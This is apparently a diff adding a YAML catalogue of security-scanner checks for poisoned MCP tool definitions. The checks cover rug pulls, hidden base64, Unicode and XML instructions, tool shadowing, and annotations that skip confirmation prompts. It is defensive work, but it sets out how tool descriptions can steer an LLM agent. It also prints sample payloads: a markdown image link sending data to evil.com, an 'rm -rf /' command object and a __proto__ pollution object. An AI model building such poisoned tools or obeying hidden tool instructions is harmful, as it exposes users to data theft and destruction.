@@ -1,0 +1,632 @@
+category: tool_poisoning
+checks:
+  - id: tp006
+    slug: rug_pull_detection
+    title: "Rug Pull Detection — Tool Definition Drift"
+    severity: critical
+    description: >
+      Detects when MCP tool definitions change between sessions without explicit
+      user consent. A malicious server can initially present benign tool
+      definitions to pass review, then silently alter descriptions, parameters,
+      or behaviour in subsequent sessions to perform harmful actions — a
+      technique known as a rug pull attack.
+    risk_explanation: >
+      Tool definition drift allows an attacker to bypass initial security review.
+      Once the user or LLM trusts a tool based on its original definition, the
+      attacker modifies it to exfiltrate data, escalate privileges, or execute
+      malicious commands. Because the change happens between sessions, there is
+      no opportunity for the user to review or consent to the new behaviour.
+    remediation: >
+      Implement tool definition pinning by hashing tool schemas and descriptions
+      on first use and comparing them on subsequent sessions. Alert the user when
+      any tool definition changes. Require explicit user approval before accepting
+      modified tool definitions. Use version-pinned server references where
+      available.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks"
+    owasp_mcp:
+      - "MCP02:2025"
+      - "MCP04:2025"
+    tags:
+      - tool_poisoning
+      - rug_pull
+      - definition_drift
+      - session_integrity
+
+  - id: tp007
+    slug: schema_poisoning
+    title: "Schema Poisoning via Default Values"
+    severity: high
+    description: >
+      Detects tool schemas containing default parameter values that inject
+      unintended instructions or override user-supplied intent. Attackers embed
+      malicious defaults in JSON Schema definitions so that when the LLM omits
+      a parameter, the default silently takes effect with harmful consequences.
+    risk_explanation: >
+      Schema default values are processed before user input is validated. A
+      malicious default can silently force a tool to operate on a different
+      target, use elevated permissions, or include exfiltration payloads. Because
+      defaults are not typically displayed in user-facing UIs, users remain
+      unaware of the injected behaviour.
+    remediation: >
+      Review all tool parameter defaults for suspicious values. Remove defaults
+      that encode commands, URLs, or complex objects. Require explicit user
+      confirmation for any parameter that has a security-relevant default value.
+      Implement server-side validation that rejects schemas with suspicious
+      default patterns.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - schema_poisoning
+      - default_values
+      - parameter_injection
+
+  - id: tp008
+    slug: unicode_homoglyph_tool_names
+    title: "Unicode Homoglyph Tool Names"
+    severity: high
+    description: >
+      Detects tool names that use Unicode homoglyph characters to visually
+      impersonate legitimate tool names. Confusable characters such as Cyrillic
+      'a' (U+0430) in place of Latin 'a' (U+0061) make tool names appear
+      identical to trusted tools while being technically different identifiers.
+    risk_explanation: >
+      Homoglyph tool names trick both users and LLMs into invoking a malicious
+      tool believing it to be a trusted one. The attacker's tool can intercept
+      parameters meant for the legitimate tool, exfiltrate sensitive data, or
+      return manipulated results. Visual inspection alone cannot distinguish
+      homoglyph names from originals.
+    remediation: >
+      Normalize all tool names to ASCII or a canonical Unicode form (NFC/NFKC)
+      before registration. Reject tool names containing characters from mixed
+      scripts (e.g. Latin mixed with Cyrillic). Implement confusable detection
+      using Unicode Technical Standard #39 security mechanisms.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://unicode.org/reports/tr39/"
+    owasp_mcp:
+      - "MCP02:2025"
+      - "MCP06:2025"
+    tags:
+      - tool_poisoning
+      - homoglyph
+      - unicode
+      - impersonation
+
+  - id: tp009
+    slug: base64_encoded_instructions
+    title: "Base64-Encoded Instructions in Descriptions"
+    severity: high
+    description: >
+      Detects base64-encoded content embedded within tool descriptions. Attackers
+      encode malicious instructions in base64 to bypass content filtering and
+      hide prompt injection payloads from human reviewers. The LLM may decode
+      and follow these hidden instructions during tool invocation.
+    risk_explanation: >
+      Base64-encoded instructions evade both automated scanning and manual
+      review. When an LLM encounters base64 content, it may decode and execute
+      the embedded instructions, which could direct it to exfiltrate data, invoke
+      other tools, or override user intent. This technique is particularly
+      effective because base64 strings appear as harmless opaque data.
+    remediation: >
+      Scan all tool descriptions for base64-encoded content patterns. Reject or
+      flag descriptions containing valid base64 strings above a minimum length
+      threshold. Implement content-security policies that strip or decode base64
+      content before presenting descriptions to the LLM. Require plain-text
+      descriptions only.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - base64
+      - encoded_instructions
+      - obfuscation
+
+  - id: tp010
+    slug: cross_server_tool_shadowing
+    title: "Cross-Server Tool Name Collision"
+    severity: critical
+    description: >
+      Detects when multiple MCP servers expose tools with identical names. When
+      two servers register a tool with the same name, the LLM may invoke the
+      wrong implementation, allowing a malicious server to shadow a legitimate
+      tool and intercept its invocations.
+    risk_explanation: >
+      Cross-server tool name collisions enable a malicious server to silently
+      replace a trusted tool. The attacker's implementation receives all
+      parameters intended for the legitimate tool, including sensitive data such
+      as credentials, file paths, and database queries. The malicious tool can
+      also return falsified results that influence subsequent LLM reasoning.
+    remediation: >
+      Implement namespace prefixing for tool names using the server identity
+      (e.g. server_name.tool_name). Detect and alert on tool name collisions
+      across registered servers before allowing invocations. Require users to
+      explicitly resolve collisions by selecting the intended server. Use tool
+      annotations to verify server provenance.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks"
+    owasp_mcp:
+      - "MCP02:2025"
+      - "MCP06:2025"
+    tags:
+      - tool_poisoning
+      - tool_shadowing
+      - name_collision
+      - cross_server
+
+  - id: tp011
+    slug: invisible_unicode_in_descriptions
+    title: "Invisible Unicode Characters in Tool Descriptions"
+    severity: high
+    description: >
+      Detects zero-width characters, bidirectional override markers, and other
+      invisible Unicode codepoints hidden within tool descriptions. These
+      characters can conceal malicious instructions that are invisible in UIs
+      but processed by LLMs, enabling covert prompt injection.
+    risk_explanation: >
+      Invisible Unicode characters allow attackers to embed instructions that
+      are completely hidden from human reviewers. Zero-width spaces, joiners,
+      and bidirectional text markers can encode hidden messages or alter the
+      visual ordering of text to disguise malicious content. LLMs process the
+      full Unicode string, following instructions that users cannot see.
+    remediation: >
+      Strip all zero-width and invisible Unicode characters from tool
+      descriptions before processing. Implement a Unicode allowlist that permits
+      only visible, printable characters in tool metadata. Flag descriptions
+      containing bidirectional override characters (U+202A-U+202E, U+2066-U+2069)
+      or zero-width codepoints (U+200B-U+200F, U+FEFF).
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - invisible_unicode
+      - zero_width
+      - bidirectional
+
+  - id: tp012
+    slug: tool_description_url_injection
+    title: "URL Injection in Tool Descriptions"
+    severity: medium
+    description: >
+      Detects suspicious URLs embedded in tool descriptions that may be used
+      for data exfiltration or phishing. Tool descriptions containing URLs
+      to external services can direct the LLM to send sensitive data to
+      attacker-controlled endpoints during tool invocation.
+    risk_explanation: >
+      URLs in tool descriptions can instruct the LLM to fetch from or post data
+      to external endpoints. An attacker can embed an exfiltration URL that
+      receives sensitive context data, tool outputs, or user credentials as URL
+      parameters. The LLM may follow URL-based instructions without user
+      awareness, especially when the URL is presented as documentation.
+    remediation: >
+      Scan tool descriptions for embedded URLs and validate them against an
+      allowlist of trusted domains. Flag descriptions containing URLs with
+      query parameters, IP addresses, or uncommon TLDs. Remove or neutralize
+      URLs that are not essential for tool documentation. Implement content
+      filtering to prevent the LLM from following description-embedded URLs.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - url_injection
+      - exfiltration
+      - description_analysis
+
+  - id: tp013
+    slug: excessive_tool_parameters
+    title: "Excessive Tool Parameter Count"
+    severity: medium
+    description: >
+      Detects tools with an unreasonably large number of parameters, which may
+      indicate complexity designed to hide malicious parameters among legitimate
+      ones. An excessive parameter count increases the attack surface and makes
+      manual review impractical.
+    risk_explanation: >
+      Tools with many parameters are difficult to review and audit. An attacker
+      can hide a malicious parameter (e.g. an exfiltration target, a command
+      injection field) among dozens of legitimate-looking parameters. The LLM
+      may populate these hidden parameters with sensitive data from context
+      without the user noticing the extra fields.
+    remediation: >
+      Set a maximum parameter count threshold for tools (e.g. 15-20 parameters).
+      Flag tools exceeding this threshold for manual review. Encourage tool
+      designers to use structured sub-objects instead of flat parameter lists.
+      Audit each parameter individually for tools that legitimately require many
+      inputs.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - excessive_parameters
+      - complexity
+      - review_evasion
+
+  - id: tp014
+    slug: recursive_tool_invocation_risk
+    title: "Recursive Tool Invocation Risk"
+    severity: high
+    description: >
+      Detects tool descriptions that encourage or instruct the LLM to invoke
+      additional tools in a recursive or chained fashion. Malicious descriptions
+      can create tool invocation loops or chains that escalate privileges,
+      exfiltrate data across multiple steps, or cause denial of service.
+    risk_explanation: >
+      Recursive tool invocation can amplify the impact of a single poisoned tool.
+      An attacker's tool description instructs the LLM to call another tool with
+      manipulated parameters, creating a chain that progressively escalates
+      access or exfiltrates data in stages. Unbounded recursion can also exhaust
+      resources, causing denial of service.
+    remediation: >
+      Implement invocation depth limits for tool chains. Detect and flag tool
+      descriptions that reference other tools by name or instruct the LLM to
+      perform additional invocations. Require explicit user approval for each
+      step in a tool invocation chain. Monitor for circular invocation patterns.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - recursive_invocation
+      - tool_chaining
+      - denial_of_service
+
+  - id: tp015
+    slug: tool_name_impersonation
+    title: "Tool Name Impersonation"
+    severity: high
+    description: >
+      Detects tools named to impersonate well-known, trusted tool names with
+      minor variations such as typosquatting, prefix/suffix additions, or
+      abbreviation differences. Examples include 'read_flie' instead of
+      'read_file' or 'secure_read_file' shadowing 'read_file'.
+    risk_explanation: >
+      Tool name impersonation exploits the LLM's tendency to select tools by
+      name similarity. A tool named to closely match a trusted tool may be
+      selected instead, intercepting sensitive operations. The attacker's tool
+      receives all parameters and context intended for the legitimate tool,
+      enabling data theft or result manipulation.
+    remediation: >
+      Implement Levenshtein distance or similar fuzzy matching to detect tool
+      names that are suspiciously similar to known trusted tools. Maintain a
+      registry of canonical tool names and flag new tools with names within a
+      configurable edit distance. Require explicit user confirmation when
+      similarly-named tools are detected.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+      - "MCP06:2025"
+    tags:
+      - tool_poisoning
+      - impersonation
+      - typosquatting
+      - name_similarity
+
+  - id: tp016
+    slug: hidden_xml_attributes
+    title: "Hidden XML Attributes in Descriptions"
+    severity: high
+    description: >
+      Detects XML attributes embedded in tool descriptions that smuggle hidden
+      instructions to the LLM. Attributes such as data-instruction, aria-label,
+      or custom attributes within XML/HTML tags can carry payloads that are
+      processed by the LLM but not visible in rendered UI output.
+    risk_explanation: >
+      XML attributes in descriptions provide a covert channel for prompt
+      injection. While the visible text of a description may appear benign, XML
+      attributes can carry full instruction sets that the LLM parses and follows.
+      This technique bypasses content-based security filters that only examine
+      visible text content.
+    remediation: >
+      Parse and strip all XML/HTML attributes from tool descriptions before
+      presenting them to the LLM. Implement a strict content policy that rejects
+      descriptions containing markup with attributes. Use plain-text-only
+      description policies. Flag descriptions containing XML/HTML tag patterns
+      for manual review.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - xml_attributes
+      - hidden_instructions
+      - markup_smuggling
+
+  - id: tp017
+    slug: markdown_injection
+    title: "Markdown Link Injection in Descriptions"
+    severity: medium
+    description: >
+      Detects hidden markdown links in tool descriptions that can trigger data
+      exfiltration. Markdown image tags and links with encoded parameters can
+      cause the LLM to request external URLs, leaking context data via query
+      strings or path segments.
+    risk_explanation: >
+      Markdown links in tool descriptions can exfiltrate data when the LLM
+      renders or follows them. An image tag like ![img](https://evil.com/?data=...)
+      can encode sensitive context in the URL. The LLM may automatically resolve
+      these links, sending user data to attacker-controlled servers without any
+      visible indication to the user.
+    remediation: >
+      Strip or neutralize markdown links and image references in tool
+      descriptions. Implement URL validation for any links that must be retained.
+      Block descriptions containing markdown image tags that reference external
+      domains. Use content security policies to prevent automatic URL resolution
+      from description content.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - markdown_injection
+      - exfiltration
+      - link_injection
+
+  - id: tp018
+    slug: json_injection_in_defaults
+    title: "JSON Injection in Parameter Defaults"
+    severity: high
+    description: >
+      Detects serialized JSON objects embedded in parameter default values.
+      Complex JSON defaults can encode instructions, configuration overrides,
+      or nested command structures that alter tool behaviour in ways not
+      apparent from the schema surface.
+    risk_explanation: >
+      JSON objects in parameter defaults can carry structured payloads that
+      override tool configuration, inject additional parameters, or encode
+      command sequences. When the LLM does not supply a value for the parameter,
+      the malicious default takes effect, potentially altering the tool's target,
+      scope, or permissions without user awareness.
+    remediation: >
+      Reject parameter defaults that contain serialized JSON objects, arrays, or
+      complex nested structures. Restrict defaults to simple scalar values
+      (strings, numbers, booleans). Implement schema validation that flags
+      defaults containing curly braces, brackets, or JSON-parseable content.
+      Require explicit user confirmation for parameters with non-trivial defaults.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - json_injection
+      - default_values
+      - parameter_manipulation
+
+  - id: tp019
+    slug: tool_description_length_ratio
+    title: "Abnormal Description-to-Name Length Ratio"
+    severity: low
+    description: >
+      Detects tools with suspiciously long descriptions relative to their tool
+      name length. An extremely high description-to-name ratio may indicate that
+      the description contains hidden instructions, encoded payloads, or
+      excessive content designed to influence LLM behaviour beyond documenting
+      the tool's legitimate purpose.
+    risk_explanation: >
+      Abnormally long descriptions provide more surface area for embedding
+      hidden instructions, prompt injection payloads, and social engineering
+      content. While long descriptions alone are not malicious, they increase
+      the probability that injected content goes unnoticed during review and
+      provide more tokens for the LLM to process as instructions.
+    remediation: >
+      Set a maximum description length threshold relative to tool complexity.
+      Flag descriptions exceeding a configurable character limit (e.g. 2000
+      characters) for manual review. Compare description lengths across tools
+      in the same server to identify outliers. Encourage concise, focused tool
+      descriptions.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - description_length
+      - anomaly_detection
+      - heuristic
+
+  - id: tp020
+    slug: conflicting_parameter_descriptions
+    title: "Conflicting Parameter Descriptions"
+    severity: medium
+    description: >
+      Detects tool parameters whose descriptions contradict the stated purpose
+      of the tool. For example, a tool described as "read-only file viewer"
+      with a parameter described as "path to write output" indicates a mismatch
+      that may signal deceptive intent.
+    risk_explanation: >
+      Conflicting parameter descriptions can mislead the LLM into passing
+      sensitive data to parameters that perform unintended operations. A tool
+      claiming to be read-only while accepting write-oriented parameters can
+      trick the LLM into authorizing destructive operations. The contradiction
+      between tool purpose and parameter intent is a strong indicator of
+      deception.
+    remediation: >
+      Implement semantic analysis to detect contradictions between tool-level
+      descriptions and parameter-level descriptions. Flag parameters whose
+      descriptions suggest capabilities not mentioned in the tool description.
+      Require consistent terminology between tool descriptions and their
+      parameter documentation.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - conflicting_descriptions
+      - semantic_analysis
+      - deception_detection
+
+  - id: tp021
+    slug: tool_capability_escalation
+    title: "Tool Capability Escalation"
+    severity: high
+    description: >
+      Detects tools that request or imply capabilities beyond their stated
+      purpose. For example, a tool described as a "text formatter" that accepts
+      file path parameters or network URLs indicates capability escalation
+      beyond its documented scope.
+    risk_explanation: >
+      Tools with capabilities beyond their stated purpose can perform undisclosed
+      operations. A user who approves a "text formatter" does not expect it to
+      access the filesystem or make network requests. The hidden capabilities
+      can be exploited by prompt injection to perform actions the user never
+      intended to authorize.
+    remediation: >
+      Validate that tool parameters are consistent with the tool's stated
+      purpose. Flag tools whose parameter schemas suggest filesystem, network,
+      or system access when the tool description does not mention these
+      capabilities. Implement capability labelling that maps parameters to
+      required permissions.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - capability_escalation
+      - scope_creep
+      - hidden_capabilities
+
+  - id: tp022
+    slug: time_of_check_time_of_use
+    title: "TOCTOU in Tool Definitions"
+    severity: critical
+    description: >
+      Detects time-of-check-time-of-use vulnerabilities where tool definitions
+      can change between the listing phase (when tools are reviewed) and the
+      invocation phase (when tools are executed). A malicious server can present
+      safe definitions during listing but swap them at invocation time.
+    risk_explanation: >
+      TOCTOU attacks on tool definitions undermine all security review. The user
+      or automated scanner validates a safe tool definition, but the server
+      returns a different definition when the tool is actually invoked. This
+      allows arbitrary code execution, data exfiltration, and privilege
+      escalation after the security check has passed.
+    remediation: >
+      Pin tool definitions at listing time and verify they match at invocation
+      time using cryptographic hashes. Implement tool definition caching on the
+      client side with integrity verification. Reject tool invocations where the
+      server's current definition does not match the previously reviewed
+      definition. Use signed tool manifests where available.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+      - "MCP04:2025"
+    tags:
+      - tool_poisoning
+      - toctou
+      - definition_integrity
+      - race_condition
+
+  - id: tp023
+    slug: description_language_mismatch
+    title: "Description Language Mismatch"
+    severity: low
+    description: >
+      Detects tool descriptions written in a different natural language than the
+      server's configured locale or the majority of other tool descriptions.
+      Language mismatches can indicate copied content from foreign attack
+      toolkits or deliberate obfuscation of malicious instructions.
+    risk_explanation: >
+      Descriptions in unexpected languages may contain instructions that bypass
+      content filtering rules designed for the server's primary language. They
+      can also indicate that tool descriptions were copied from an attack
+      framework without localization. Multilingual LLMs may follow instructions
+      in any language, making foreign-language injection viable.
+    remediation: >
+      Implement language detection on tool descriptions and flag those that do
+      not match the server's expected locale. Require all tool descriptions to
+      be in a consistent language. Review foreign-language descriptions manually
+      for hidden instructions or suspicious content.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - language_mismatch
+      - locale
+      - obfuscation
+
+  - id: tp024
+    slug: parameter_type_coercion
+    title: "Parameter Type Coercion Risk"
+    severity: medium
+    description: >
+      Detects tool parameters with loose type definitions that allow injection
+      via type coercion. Parameters typed as 'any', 'string | object', or using
+      oneOf with mixed types can be exploited by providing structured objects
+      where strings are expected, bypassing validation.
+    risk_explanation: >
+      Loose parameter types allow attackers to pass structured objects instead
+      of simple values. A parameter expecting a filename string that also
+      accepts objects can receive a payload like {"__proto__": {...}} or
+      {"command": "rm -rf /"}. Type coercion bypasses string-based validation
+      rules and can trigger unexpected code paths in the server.
+    remediation: >
+      Define explicit, strict types for all tool parameters. Avoid 'any' type
+      and mixed-type unions. Use JSON Schema's type keyword with a single
+      concrete type. Implement server-side type checking that rejects values
+      not matching the declared type. Add format constraints for string
+      parameters (e.g. "format": "uri" for URLs).
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - type_coercion
+      - loose_typing
+      - schema_weakness
+
+  - id: tp025
+    slug: tool_annotation_abuse
+    title: "Tool Annotation Abuse"
+    severity: high
+    description: >
+      Detects misuse of MCP tool annotations such as readOnlyHint,
+      destructiveHint, idempotentHint, and openWorldHint. A malicious server can
+      set readOnlyHint to true on a destructive tool or destructiveHint to false
+      on a tool that deletes data, causing the LLM to bypass safety
+      confirmations.
+    risk_explanation: >
+      Tool annotations are used by LLM clients to determine whether user
+      confirmation is needed before invocation. A tool falsely annotated as
+      read-only bypasses confirmation dialogs, allowing destructive operations
+      to execute without user consent. Mismatched annotations undermine the
+      entire trust model of the tool invocation pipeline.
+    remediation: >
+      Verify tool annotations against actual tool behaviour by analyzing
+      parameter schemas and description content. Flag tools where annotations
+      contradict their apparent capabilities (e.g. readOnlyHint=true with write
+      parameters). Implement annotation validation that cross-references hints
+      with the tool's declared operations. Never rely solely on server-provided
+      annotations for security decisions.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://modelcontextprotocol.io/specification/2025-03-26/server/tools"
+    owasp_mcp:
+      - "MCP02:2025"
+    tags:
+      - tool_poisoning
+      - annotation_abuse
+      - tool_hints
+      - trust_model
